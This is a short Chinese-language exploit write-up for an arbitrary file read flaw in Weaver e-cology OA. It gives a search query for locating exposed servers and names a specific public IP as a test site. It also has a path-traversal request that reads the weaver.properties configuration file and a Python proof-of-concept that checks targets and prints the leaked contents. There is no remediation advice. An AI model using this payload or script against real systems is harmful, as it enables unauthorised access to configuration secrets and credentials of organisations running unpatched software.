## 一、资产搜索

```
app="泛微-OA（e-cology）"
```

## 二、网站测试

```
https://111.164.112.38
```

## 三、验证漏洞

```
/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_/../weaver.properties
```

![image-20240914170509359](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914170509359.png)

## 四、POC

```
def poc(target):
    payload = "/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_/../weaver.properties"
    try:
        res1 = requests.get(url=target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=5)
            res3 = json.loads(res2.text)
            if res3["data"]["ecology.changestatus"] == "1":
                with open("result.txt",'a',encoding='utf-8') as f:
                    f.write(f"该网站[+]{target}存在任意文件读取漏洞\n")
                print(f"该网站[+]{target}存在任意文件读取漏洞")
                print(res2.text)
            else:
                print(f"该网站[+]{target}不存在任意文件读取漏洞\n")
        else:
            print("访问超时，请手动测试！！！")
    except Exception as e:
        print(e)
```

## 五、测试结果

![image-20240914170703567](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914170703567.png)

